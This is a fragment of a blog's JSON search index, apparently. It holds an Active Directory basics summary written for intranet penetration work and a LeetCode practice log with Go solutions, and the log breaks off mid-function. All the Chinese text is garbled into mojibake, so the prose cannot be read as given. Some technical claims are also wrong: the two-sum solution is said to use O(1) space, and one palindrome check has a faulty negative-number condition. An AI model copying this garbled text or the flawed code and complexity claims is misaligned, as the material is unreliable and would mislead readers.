        "summary": "å†…ç½‘æ¸—é€-ADåŸŸåŸºç¡€çŸ¥è¯† ç®€ä»‹ å†…ç½‘ä¹ŸæŒ‡å±€åŸŸç½‘ï¼Œæ˜¯ä¸€ä¸ªå°é—­çš„ç½‘ç»œç©ºé—´\nå†…ç½‘æ¸—é€ï¼ˆintranet exploitationï¼‰æ˜¯å¯¹ç›®æ ‡æœåŠ¡å™¨getshellåï¼Œé€šè¿‡ä¸€ç³»åˆ—æŠ€æœ¯æ‰‹æ®µå¯¹å…¶æ‰€å¤„çš„å†…ç½‘ç¯å¢ƒè¿›è¡Œæ¸—é€ï¼Œæœ€ç»ˆè·å–å†…ç½‘å…¶ä»–ä¸»æœºçš„æƒé™çš„è¿‡ç¨‹ï¼Œè¿™äº›é€šå¸¸æ¶‰åŠä»¥ä¸‹æŠ€æœ¯ï¼š\nå†…ç½‘ä¿¡æ¯æ”¶é›† å†…ç½‘ä»£ç† æƒé™æå‡ æ¨ªå‘ç§»åŠ¨ \u0026hellip;\u0026hellip; åŸºæœ¬æ¦‚å¿µ å·¥ä½œç»„ï¼ˆwork groupï¼‰ åˆ†è¾¨ï¼šåœ¨å‘½ä»¤æç¤ºç¬¦ç•Œé¢æ‰§è¡Œsysteminfoï¼Œå›æ˜¾ç»“æœçš„â€œåŸŸâ€ä¿¡æ¯ä¸ºWORKGROUP\nç®€å•æ¥è¯´ï¼Œå°±æ˜¯å°†ä¸åŒçš„è®¡ç®—æœºæŒ‰ç…§åŠŸèƒ½æˆ–éƒ¨é—¨åˆ†åˆ«ç½®äºä¸åŒçš„ç»„ï¼Œé€‚ç”¨äºç½‘ç»œä¸­è®¡ç®—æœºä¸å¤šã€èµ„äº§è§„æ¨¡è¾ƒå°ã€å¯¹å®‰å…¨ç®¡ç†æ§åˆ¶è¦æ±‚ä¸ä¸¥æ ¼çš„æƒ…å†µï¼Œè¿™æ˜¯ä¸€ç§æ¾æ•£çš„èµ„æºç®¡ç†æ¨¡å¼ï¼Œä»»ä½•äººéƒ½å¯ä»¥åœ¨å±€åŸŸç½‘ä¸­åˆ›å»ºæ–°çš„å·¥ä½œä»»åŠ¡è€Œæ— éœ€ç®¡ç†å‘˜åŒæ„ï¼Œæ¢è¨€ä¹‹ï¼Œå¤„äºåŒä¸€å·¥ä½œç»„ä¸­çš„ä¸»æœºå½¼æ­¤é—´åœ°ä½å¹³ç­‰ï¼Œä¸å­˜åœ¨é¢å¤–å…³è”æˆ–ç®¡ç†å…³ç³»ï¼Œå¯¹äºæ­¤ç±»æƒ…å†µï¼Œåœ¨å†…ç½‘æ¸—é€æ—¶éœ€è¦é€ä¸ªæ¸—é€ä¸æ§åˆ¶\nåœ¨å±€åŸŸç½‘å†…ï¼Œè®¡ç®—æœºé»˜è®¤éƒ½æ˜¯æŒ‰ç…§å·¥ä½œç»„çš„æ–¹å¼è¿›è¡Œèµ„æºç®¡ç†çš„\nä¼˜ç‚¹ï¼š æ–¹ä¾¿ç®¡ç†å’Œç»´æŠ¤ èµ„æºåˆ†é…æ–¹ä¾¿å’Œçµæ´» ç¼ºç‚¹ï¼š ç¼ºä¹é›†ä¸­ç®¡ç†ä¸æ§åˆ¶çš„æœºåˆ¶ æ²¡æœ‰é›†ä¸­çš„ç»Ÿä¸€è´¦æˆ·ç®¡ç† åªé€‚åˆå°è§„æ¨¡ç”¨æˆ·çš„ä½¿ç”¨ åŸŸï¼ˆdomainï¼‰ åˆ†è¾¨ï¼šåœ¨å‘½ä»¤æç¤ºç¬¦ç•Œé¢æ‰§è¡Œsysteminfoï¼Œå›æ˜¾ç»“æœçš„â€œåŸŸâ€ä¿¡æ¯ä¸ºç±»ä¼¼åŸŸåæ ¼å¼ï¼Œç”±â€œ.â€è¿æ¥çš„å­—ç¬¦ä¸²\nå½“ç»„ç»‡ä¸­ç½‘ç»œè§„æ¨¡è¶Šæ¥è¶Šå¤§æ—¶ï¼Œéœ€è¦ç»Ÿä¸€çš„ç®¡ç†å’Œé›†ä¸­çš„èº«ä»½éªŒè¯ï¼Œå¹¶èƒ½ä¸ºç”¨æˆ·æä¾›æ›´åŠ æ–¹ä¾¿åœ°çš„ç½‘ç»œèµ„æºæœç´¢å’Œä½¿ç”¨æ–¹å¼æ—¶ï¼Œå°±éœ€è¦æ”¾å¼ƒå·¥ä½œç»„è€Œä½¿ç”¨åŸŸ\nåŸŸæ˜¯ä¸€ç§æ¯”å·¥ä½œç»„æ›´é«˜çº§çš„çš„è®¡ç®—æœºèµ„æºç®¡ç†æ¨¡å¼ï¼Œåœ¨åŸŸç¯å¢ƒä¸­ï¼Œæ‰€æœ‰ç”¨æˆ·è´¦æˆ·ã€ç”¨æˆ·ç»„ã€è®¡ç®—æœºã€æ‰“å°æœºå’Œå…¶ä»–å®‰å…¨ä¸»ä½“éƒ½åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªåŸŸæ§åˆ¶å™¨çš„ä¸­å¤®æ•°æ®åº“ä¸­æ³¨å†Œï¼›å½“åŸŸç”¨æˆ·æƒ³è®¿é—®åŸŸä¸­çš„èµ„æºæ—¶ï¼Œå¿…é¡»é€šè¿‡åŸŸæ§åˆ¶å™¨é›†ä¸­è¿›è¡Œèº«ä»½éªŒè¯ï¼Œé€šè¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·åœ¨åŸŸä¸­çš„èº«ä»½å†³å®šäº†åŸŸç”¨æˆ·å¯¹åŸŸä¸­èµ„æºçš„è®¿é—®æƒé™\nåœ¨åŸŸç¯å¢ƒä¸­ï¼ŒåŸŸç®¡ç†å‘˜ç”¨æˆ·åœ¨åŸŸä¸­å…·æœ‰æœ€é«˜è®¿é—®æƒé™å’Œæœ€é«˜ç®¡ç†æƒé™ï¼Œåœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œè·å–åŸŸç®¡ç†å‘˜ç›¸å…³æƒé™å¾€å¾€å¯ä»¥æ§åˆ¶æ•´ä¸ªåŸŸæ§\nå•åŸŸ\næŒ‡ç½‘ç»œç¯å¢ƒä¸­åªæœ‰ä¸€ä¸ªåŸŸ\nçˆ¶åŸŸå’Œå­åŸŸ\næŸäº›æƒ…å†µä¸‹ï¼Œéœ€è¦åœ¨ä¸€ä¸ªåŸŸä¸­åˆ†å‡ºå¤šä¸ªåŸŸï¼Œè¢«åˆ’åˆ†çš„åŸŸç§°ä¸ºçˆ¶åŸŸï¼Œåˆ’åˆ†å‡ºæ¥çš„åŸŸè¢«ç§°ä¸ºå­åŸŸï¼Œæ¯ä¸ªå­åŸŸéƒ½æ‹¥æœ‰è‡ªå·±çš„å®‰å…¨ç­–ç•¥ï¼Œåœ¨æœ‰ä¿¡ä»»çš„æƒ…å†µä¸‹ï¼Œçˆ¶åŸŸå¯ä»¥è®¿é—®å­åŸŸ\nä»åŸŸåä¸Šçœ‹ï¼Œå­åŸŸæ˜¯åŸŸåä¸­çš„ä¸€ä¸ªæ®µï¼Œç”¨â€œ.â€è¿›è¡ŒåŸŸååˆ†å‰²ï¼Œä¸€ä¸ªâ€œ.â€ä»£è¡¨åŸŸåçš„ä¸€ä¸ªå±‚çº§\nåŸŸæ ‘\nåŸŸæ ‘æ˜¯å¤šä¸ªåŸŸé€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„ä¸€ä¸ªåŸŸé›†åˆ\nåœ¨åŸŸæ ‘ä¸­ï¼Œæ‰€æœ‰çš„åŸŸå…±äº«åŒä¸€è¡¨ç»“æ„å’Œé…ç½®ï¼Œæ‰€æœ‰åŸŸåå½¢æˆä¸€ä¸ªè¿ç»­çš„åå­—ç©ºé—´ï¼Œè¯¥å‘½åç©ºé—´å…·æœ‰è¿ç»­æ€§ï¼ŒåŸŸåå±‚æ¬¡è¶Šæ·±ï¼Œçº§åˆ«è¶Šä½\nåœ¨åŸŸæ ‘ä¸­ï¼ŒåŸŸç®¡ç†å‘˜åªèƒ½ç®¡ç†æœ¬åŸŸï¼Œä¸èƒ½è®¿é—®æˆ–ç®¡ç†å…¶ä»–åŸŸï¼Œå¦‚æœä¸¤ä¸ªåŸŸä¹‹é—´è¦äº’ç›¸è®¿é—®ï¼Œå°±éœ€è¦å»ºç«‹ä¿¡ä»»å…³ç³»ï¼ˆtrust relationï¼‰\nåŸŸæ—\næŒ‡ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ²¡æœ‰å½¢æˆè¿ç»­åå­—ç©ºé—´çš„åŸŸæ ‘é€šè¿‡å»ºç«‹ä¿¡ä»»å…³ç³»ç»„æˆçš„åŸŸæ ‘é›†åˆï¼ŒåŸŸæ—ä¸­æ‰€æœ‰åŸŸæ ‘å…±äº«åŒä¸€ä¸ªè¡¨ç»“æ„ã€é…ç½®å’Œå…¨å±€ç›®å½•\nåŸŸæ§åˆ¶å™¨ åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼ŒDCï¼‰ç®€ç§°åŸŸæ§ï¼Œæ˜¯åŸŸç¯å¢ƒæ ¸å¿ƒçš„æœåŠ¡å™¨è®¡ç®—æœºï¼Œç”¨äºåœ¨åŸŸä¸­å“åº”å®‰å…¨èº«ä»½è®¤è¯è¯·æ±‚ï¼Œè´Ÿè´£å…è®¸æˆ–æ‹’ç»å‘å‡ºè¯·æ±‚çš„ä¸»æœºè®¿é—®åŸŸå†…èµ„æºï¼Œä»¥åŠå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€å­˜å‚¨ç”¨æˆ·è´¦æˆ·ä¿¡æ¯å¹¶æ‰§è¡ŒåŸŸçš„å®‰å…¨ç­–ç•¥ç­‰ï¼ŒåŸŸæ§åŒ…å«ä¸€ä¸ªæ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼Œå…¶ä¸­å­˜å‚¨ç€æ•´ä¸ªåŸŸçš„è´¦æˆ·ã€å¯†ç ã€è®¡ç®—æœºç­‰ä¿¡æ¯ï¼Œè€Œå‰é¢æåˆ°çš„èº«ä»½éªŒè¯ä¾¿ä¸»è¦æœ‰ä»¥ä¸‹æ­¥éª¤ï¼š\nè¯¥è®¡ç®—æœºæ˜¯å¦å±äºæœ¬åŸŸ ç™»å½•è´¦å·æ˜¯å¦å­˜åœ¨ å¯†ç æ˜¯å¦æ­£ç¡® ä¸€ä¸ªåŸŸç¯å¢ƒå¯ä»¥æ‹¥æœ‰ä¸€å°æˆ–å¤šå°åŸŸæ§åˆ¶å™¨ï¼Œæ¯å°åŸŸæ§éƒ½å„è‡ªå­˜å‚¨äº†ä¸€ä»½æ‰€åœ¨åŸŸçš„æ´»åŠ¨ç›®å½•ADçš„å¯å†™å‰¯æœ¬ï¼Œå¯¹ADçš„ä¿®æ”¹éƒ½å¯ä»¥ä»æºåŸŸæ§åŒæ­¥å¤åˆ¶åˆ°åŸŸã€åŸŸæ ‘æˆ–åŸŸæ—çš„å…¶ä»–æ§åˆ¶å™¨ä¸Šï¼Œè¿™æ ·å³ä½¿å…¶ä¸­ä¸€å°åŸŸæ§ç˜«ç—ªï¼Œå¦ä¸€å°åŸŸæ§ä¹Ÿå¯ä»¥ç»§ç»­å·¥ä½œï¼Œä¿è¯åŸŸç¯å¢ƒæ­£å¸¸è¿è¡Œ\nä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒDCä¹Ÿä¼šè¢«ä½œä¸ºDNSæœåŠ¡å™¨ä½¿ç”¨\nåŸŸç¯å¢ƒæ­å»º ä¸»æœºå‡†å¤‡ æˆ‘å‡†å¤‡äº†ä¸‰å°ä¸»æœº\nwindows server 2019 datacenter windows 10 pro x64 windows 10 pro x64 é…ç½®åŸŸæ§ é…ç½®é™æ€IP æ‰“å¼€æ§åˆ¶é¢æ¿ä¸­çš„ç½‘ç»œè®¾ç½®ï¼Œå°†IPé…ç½®ä¸ºé™æ€çš„192.168.111.100ï¼š\n"
    }
,
    {
        "title": "åŠ›æ‰£leetcodeåˆ·é¢˜è®°å½•",
        "link": "/My-Knowlege-Database/blog/go%E5%BC%80%E5%8F%91/%E5%8A%9B%E6%89%A3leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/",
        "content": "åŠ›æ‰£leetcodeåˆ·é¢˜è®°å½• åœ¨ä¸€ä¸ªä¸Šç­æ‘¸é±¼çš„ä¸‹åˆï¼ŒæŠ±ç€ç»ƒç»ƒç®—æ³•å’Œgoè¯­è¨€åŸºç¡€çš„æƒ³æ³•æ‰“å¼€äº†åŠ›æ‰£ï¼Œå¹¶ä¸”å†³å®šåšæŒæ¯å¤©ä¸€é¢˜ï¼Œäºæ˜¯æœ‰äº†è¿™ç¯‡ç¬”è®°\n1.ä¸¤æ•°ä¹‹å’Œ ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º å’Œä¸ºç›®æ ‡å€¼ target çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚\nä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆï¼Œå¹¶ä¸”ä½ ä¸èƒ½ä½¿ç”¨ä¸¤æ¬¡ç›¸åŒçš„å…ƒç´ ã€‚\nä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [2,7,11,15], target = 9 è¾“å‡ºï¼š[0,1] è§£é‡Šï¼šå› ä¸º nums[0] + nums[1] == 9 ï¼Œè¿”å› [0, 1] ã€‚ ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šnums = [3,2,4], target = 6 è¾“å‡ºï¼š[1,2] ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šnums = [3,3], target = 6 è¾“å‡ºï¼š[0,1] æ–¹æ³•ä¸€ï¼šå“ˆå¸Œè¡¨ å¼€å±€ç¬¬ä¸€é¢˜ï¼Œå•¥éƒ½ä¸ä¼šï¼Œé—®äº†kimiè€å¸ˆï¼ŒçŸ¥é“äº†å“ˆå¸Œè¡¨è¿™ä¸ªä¸œè¥¿ï¼Œé‚£ä¹ˆæ€è·¯æ¸…æ™°ï¼š\nä¾æ¬¡è®¿é—®æ•°ç»„çš„å…ƒç´ å¹¶å’Œç›®æ ‡æ•°è®¡ç®—å·®å€¼ï¼Œç„¶åæŸ¥çœ‹å“ˆå¸Œè¡¨ä¸­æ˜¯å¦æœ‰è¿™ä¸ªå·®å€¼ï¼Œæ²¡æœ‰å°±å°†å½“å‰å…ƒç´ æ¨å…¥å“ˆå¸Œè¡¨ï¼Œç„¶ååˆ¤æ–­ä¸‹ä¸€ä¸ª\u0026hellip;\nä»£ç å®ç°ï¼š\nfunc twoSum(nums []int, target int) []int { numMap := make(map[int]int) for i, num := range nums { cha := target - num if j, ok := numMap[cha]; ok { return []int{j, i} } numMap[num] = i } return []int{} } æ—¶é—´å¤æ‚åº¦o(n)ï¼Œç©ºé—´å¤æ‚åº¦o(1)\n9.å›æ–‡æ•° ç»™ä½ ä¸€ä¸ªæ•´æ•° x ï¼Œå¦‚æœ x æ˜¯ä¸€ä¸ªå›æ–‡æ•´æ•°ï¼Œè¿”å› true ï¼›å¦åˆ™ï¼Œè¿”å› false ã€‚\nå›æ–‡æ•°æ˜¯æŒ‡æ­£åºï¼ˆä»å·¦å‘å³ï¼‰å’Œå€’åºï¼ˆä»å³å‘å·¦ï¼‰è¯»éƒ½æ˜¯ä¸€æ ·çš„æ•´æ•°ã€‚\nä¾‹å¦‚ï¼Œ121 æ˜¯å›æ–‡ï¼Œè€Œ 123 ä¸æ˜¯ã€‚ ç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šx = 121 è¾“å‡ºï¼štrue ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šx = -121 è¾“å‡ºï¼šfalse è§£é‡Šï¼šä»å·¦å‘å³è¯», ä¸º -121 ã€‚ ä»å³å‘å·¦è¯», ä¸º 121- ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚ ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šx = 10 è¾“å‡ºï¼šfalse è§£é‡Šï¼šä»å³å‘å·¦è¯», ä¸º 01 ã€‚å› æ­¤å®ƒä¸æ˜¯ä¸€ä¸ªå›æ–‡æ•°ã€‚ æ–¹æ³•ä¸€ï¼šè½¬å­—ç¬¦ä¸²+åŒæŒ‡é’ˆ è¿™é‡Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯è½¬æ¢ä¸ºå­—ç¬¦ä¸²å†ç»§ç»­ï¼Œé‚£ä¹ˆåŒæŒ‡é’ˆæ³•æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼Œä»ä¸¤å¤´åˆ°ä¸­é—´æ¥åˆ¤æ–­ï¼Œçœå»äº†åè½¬å­—ç¬¦ä¸²çš„ç¯èŠ‚ï¼Œå¹¶ä¸”åŒæŒ‡é’ˆçš„æ•ˆç‡ä¹Ÿæ›´é«˜ï¼Œå¦å¤–å¯ä»¥å°†ç‰¹æ®Šæƒ…å†µç›´æ¥åˆ¤æ–­ï¼Œæ¯”å¦‚è´Ÿæ•°ã€0ã€10çš„å€æ•°ï¼Œç¼ºç‚¹æ˜¯éœ€è¦å¼•å…¥strconvï¼Œä»£ç å®ç°ï¼š\nimport \u0026#34;strconv\u0026#34; func isPalindrome(x int) bool { if x \u0026lt; 0 { return false } s := strconv.Itoa(x) left, right := 0, len(s)-1 for left \u0026lt; right { if s[left] != s[right] { return false } left ++ right -- } return true } æ—¶é—´å¤æ‚åº¦o(n)ï¼Œç©ºé—´å¤æ‚åº¦o(1)\næ–¹æ³•äºŒï¼šåè½¬æ•°å­— ä¸è½¬æ¢æˆå­—ç¬¦ä¸²çš„æ¡ä»¶ä¸‹åè½¬æ•°å­—ç„¶ååˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼Œå¾ˆæ˜æ˜¾è¿™ç§æ–¹æ³•çš„æ—¶é—´å¤æ‚åº¦æ›´é«˜ï¼Œä½†å¯ä»¥æ‹¿æ¥ç»ƒç»ƒæ‰‹ï¼š\nfunc isPalindrome(x int) bool { if x \u0026lt; 0 \u0026amp;\u0026amp; x%10 == 0 { return false } if x == 0 { return true } renum := 0 tmp := x for x \u0026gt; 0 { renum = renum*10 + x%10 x /= 10 } if renum == tmp { return true } return false } æ—¶é—´å¤æ‚åº¦O(Log10(N))ï¼Œç©ºé—´å¤æ‚åº¦o(1)\n13.ç½—é©¬æ•°å­—è½¬æ•´æ•° ç½—é©¬æ•°å­—åŒ…å«ä»¥ä¸‹ä¸ƒç§å­—ç¬¦: Iï¼Œ Vï¼Œ Xï¼Œ Lï¼ŒCï¼ŒD å’Œ Mã€‚\nå­—ç¬¦ æ•°å€¼ I 1 V 5 X 10 L 50 C 100 D 500 M 1000 ä¾‹å¦‚ï¼Œ ç½—é©¬æ•°å­— 2 å†™åš II ï¼Œå³ä¸ºä¸¤ä¸ªå¹¶åˆ—çš„ 1 ã€‚12 å†™åš XII ï¼Œå³ä¸º X + II ã€‚ 27 å†™åš XXVII, å³ä¸º XX + V + II ã€‚\né€šå¸¸æƒ…å†µä¸‹ï¼Œç½—é©¬æ•°å­—ä¸­å°çš„æ•°å­—åœ¨å¤§çš„æ•°å­—çš„å³è¾¹ã€‚ä½†ä¹Ÿå­˜åœ¨ç‰¹ä¾‹ï¼Œä¾‹å¦‚ 4 ä¸å†™åš IIIIï¼Œè€Œæ˜¯ IVã€‚æ•°å­— 1 åœ¨æ•°å­— 5 çš„å·¦è¾¹ï¼Œæ‰€è¡¨ç¤ºçš„æ•°ç­‰äºå¤§æ•° 5 å‡å°æ•° 1 å¾—åˆ°çš„æ•°å€¼ 4 ã€‚åŒæ ·åœ°ï¼Œæ•°å­— 9 è¡¨ç¤ºä¸º IXã€‚è¿™ä¸ªç‰¹æ®Šçš„è§„åˆ™åªé€‚ç”¨äºä»¥ä¸‹å…­ç§æƒ…å†µï¼š\nI å¯ä»¥æ”¾åœ¨ V (5) å’Œ X (10) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 4 å’Œ 9ã€‚ X å¯ä»¥æ”¾åœ¨ L (50) å’Œ C (100) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 40 å’Œ 90ã€‚ C å¯ä»¥æ”¾åœ¨ D (500) å’Œ M (1000) çš„å·¦è¾¹ï¼Œæ¥è¡¨ç¤º 400 å’Œ 900ã€‚ ç»™å®šä¸€ä¸ªç½—é©¬æ•°å­—ï¼Œå°†å…¶è½¬æ¢æˆæ•´æ•°ã€‚\næ–¹æ³•ä¸€ï¼šå“ˆå¸Œè¡¨+æ­£è´Ÿåˆ¤æ–­ è¿™é‡Œå‚è€ƒäº†0x3få¸ˆå‚…çš„æ€è·¯ï¼Œæˆ‘ä»¬é€šè¿‡è§‚å¯Ÿå¯ä»¥å¾—å‡ºå½“å·¦è¾¹çš„æ•°å°äºå³è¾¹åˆ™éœ€è¦å³å‡å·¦ï¼Œå³ç›¸å½“äºå·¦è¾¹æ•°å­—ä¸ºè´Ÿï¼Œå³è¾¹æ•°å­—ä¸ºæ­£ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŒ‰ç…§è¿™ä¸ªé€»è¾‘åˆ¤æ–­å‡ºæ¯ä¸ªç½—é©¬å­—ç¬¦å¯¹åº”æ•°å­—çš„æ­£è´Ÿï¼Œæœ€åæ±‚å’Œå³å¯ï¼š\nfunc romanToInt(s string) int { rom := map[byte]int{ \u0026#39;I\u0026#39;:1, \u0026#39;V\u0026#39;:5, \u0026#39;X\u0026#39;:10, \u0026#39;L\u0026#39;:50, \u0026#39;C\u0026#39;:100, \u0026#39;D\u0026#39;:500, \u0026#39;M\u0026#39;:1000, } re := 0 n := len(s) for i := 0; i+1 \u0026lt; n; i++ { if rom[s[i]] \u0026lt; rom[s[i+1]] { re -= rom[s[i]] } else { re += rom[s[i]] } } return re + rom[s[n-1]] } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\n27.ç§»é™¤å…ƒç´  ç»™ä½ ä¸€ä¸ªæ•°ç»„ nums å’Œä¸€ä¸ªå€¼ valï¼Œä½ éœ€è¦åŸåœ°ç§»é™¤æ‰€æœ‰æ•°å€¼ç­‰äº val çš„å…ƒç´ ã€‚å…ƒç´ çš„é¡ºåºå¯èƒ½å‘ç”Ÿæ”¹å˜ã€‚ç„¶åè¿”å› nums ä¸­ä¸ val ä¸åŒçš„å…ƒç´ çš„æ•°é‡ã€‚\nå‡è®¾ nums ä¸­ä¸ç­‰äº val çš„å…ƒç´ æ•°é‡ä¸º kï¼Œè¦é€šè¿‡æ­¤é¢˜ï¼Œæ‚¨éœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\næ›´æ”¹ nums æ•°ç»„ï¼Œä½¿ nums çš„å‰ k ä¸ªå…ƒç´ åŒ…å«ä¸ç­‰äº val çš„å…ƒç´ ã€‚nums çš„å…¶ä½™å…ƒç´ å’Œ nums çš„å¤§å°å¹¶ä¸é‡è¦ã€‚ è¿”å› kã€‚ ç”¨æˆ·è¯„æµ‹ï¼š\nè¯„æµ‹æœºå°†ä½¿ç”¨ä»¥ä¸‹ä»£ç æµ‹è¯•æ‚¨çš„è§£å†³æ–¹æ¡ˆï¼š\nint[] nums = [...]; // è¾“å…¥æ•°ç»„ int val = ...; // è¦ç§»é™¤çš„å€¼ int[] expectedNums = [...]; // é•¿åº¦æ­£ç¡®çš„é¢„æœŸç­”æ¡ˆã€‚ // å®ƒä»¥ä¸ç­‰äº val çš„å€¼æ’åºã€‚ int k = removeElement(nums, val); // è°ƒç”¨ä½ çš„å®ç° assert k == expectedNums.length; sort(nums, 0, k); // æ’åº nums çš„å‰ k ä¸ªå…ƒç´  for (int i = 0; i \u0026lt; actualLength; i++) { assert nums[i] == expectedNums[i]; } å¦‚æœæ‰€æœ‰çš„æ–­è¨€éƒ½é€šè¿‡ï¼Œä½ çš„è§£å†³æ–¹æ¡ˆå°†ä¼š é€šè¿‡ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [3,2,2,3], val = 3 è¾“å‡ºï¼š2, nums = [2,2,_,_] è§£é‡Šï¼šä½ çš„å‡½æ•°å‡½æ•°åº”è¯¥è¿”å› k = 2, å¹¶ä¸” nums ä¸­çš„å‰ä¸¤ä¸ªå…ƒç´ å‡ä¸º 2ã€‚ ä½ åœ¨è¿”å›çš„ k ä¸ªå…ƒç´ ä¹‹å¤–ç•™ä¸‹äº†ä»€ä¹ˆå¹¶ä¸é‡è¦ï¼ˆå› æ­¤å®ƒä»¬å¹¶ä¸è®¡å…¥è¯„æµ‹ï¼‰ã€‚ ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šnums = [0,1,2,2,3,0,4,2], val = 2 è¾“å‡ºï¼š5, nums = [0,1,4,0,3,_,_,_] è§£é‡Šï¼šä½ çš„å‡½æ•°åº”è¯¥è¿”å› k = 5ï¼Œå¹¶ä¸” nums ä¸­çš„å‰äº”ä¸ªå…ƒç´ ä¸º 0,0,1,3,4ã€‚ æ³¨æ„è¿™äº”ä¸ªå…ƒç´ å¯ä»¥ä»»æ„é¡ºåºè¿”å›ã€‚ ä½ åœ¨è¿”å›çš„ k ä¸ªå…ƒç´ ä¹‹å¤–ç•™ä¸‹äº†ä»€ä¹ˆå¹¶ä¸é‡è¦ï¼ˆå› æ­¤å®ƒä»¬å¹¶ä¸è®¡å…¥è¯„æµ‹ï¼‰ã€‚ è™½ç„¶å› ä¸ºæ‰¾å·¥ä½œåŸå› ï¼Œå¾ˆä¹…æ²¡åšé¢˜äº†ï¼Œä½†ä¸€çœ‹åˆ°è¿™é¢˜å°±èƒ½æƒ³åˆ°å¿«æ…¢æŒ‡é’ˆï¼š\nfunc removeElement(nums []int, val int) int { n1,n2 := 0,0 for ;n1\u0026lt;len(nums);n1++ { if nums[n1]!=val { nums[n2] = nums[n1] n2++ } } return n2 } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\n28.æ‰¾å‡ºå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡ ç»™ä½ ä¸¤ä¸ªå­—ç¬¦ä¸² haystack å’Œ needle ï¼Œè¯·ä½ åœ¨ haystack å­—ç¬¦ä¸²ä¸­æ‰¾å‡º needle å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡ï¼ˆä¸‹æ ‡ä» 0 å¼€å§‹ï¼‰ã€‚å¦‚æœ needle ä¸æ˜¯ haystack çš„ä¸€éƒ¨åˆ†ï¼Œåˆ™è¿”å› -1 ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šhaystack = \u0026#34;sadbutsad\u0026#34;, needle = \u0026#34;sad\u0026#34; è¾“å‡ºï¼š0 è§£é‡Šï¼š\u0026#34;sad\u0026#34; åœ¨ä¸‹æ ‡ 0 å’Œ 6 å¤„åŒ¹é…ã€‚ ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹çš„ä¸‹æ ‡æ˜¯ 0 ï¼Œæ‰€ä»¥è¿”å› 0 ã€‚ ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šhaystack = \u0026#34;leetcode\u0026#34;, needle = \u0026#34;leeto\u0026#34; è¾“å‡ºï¼š-1 è§£é‡Šï¼š\u0026#34;leeto\u0026#34; æ²¡æœ‰åœ¨ \u0026#34;leetcode\u0026#34; ä¸­å‡ºç°ï¼Œæ‰€ä»¥è¿”å› -1 ã€‚ æç¤ºï¼š\n1 \u0026lt;= haystack.length, needle.length \u0026lt;= 104 haystack å’Œ needle ä»…ç”±å°å†™è‹±æ–‡å­—ç¬¦ç»„æˆ æ–¹æ³•ä¸€ï¼šå®˜æ–¹åº“ ä¸è®²ç å¾·çš„æ–¹æ³•ï¼Œç›´æ¥ä½¿ç”¨å®˜æ–¹çš„strings.Index(haystack, needle)ï¼Œä¸€å¥è¯è§£å†³ï¼š\nimport \u0026#34;strings\u0026#34; func strStr(haystack string, needle string) int { return strings.Index(haystack, needle) } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\næ–¹æ³•äºŒï¼šæš´åŠ›åŒ¹é… å¾ˆåŸºç¡€çš„æ–¹æ³•ï¼Œéå†å­—ç¬¦ä¸²ï¼Œå¹¶é€ä¸ªå¯¹æ¯”æ˜¯å¦ä¸€è‡´ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“èµ·å§‹ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾é•¿åº¦å°äºneedleé•¿åº¦ï¼Œåˆ™ä¸å¯èƒ½å­˜åœ¨ï¼Œè‹¥needleæ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œåˆ™ä¸€å®šå­˜åœ¨ï¼ˆå¦å¤–æ³¨æ„å¾ªç¯è¾¹ç•Œï¼‰ï¼š\nfunc strStr(haystack string, needle string) int { lenh := len(haystack) lenn := len(needle) if lenn == 0 { return 0 } if lenn \u0026gt; lenh { return -1 } for i := 0; i \u0026lt;= lenh - lenn ; i++ { for j := 0;j \u0026lt; lenn; j++ { if haystack[i+j] != needle[j] { break } if j == lenn 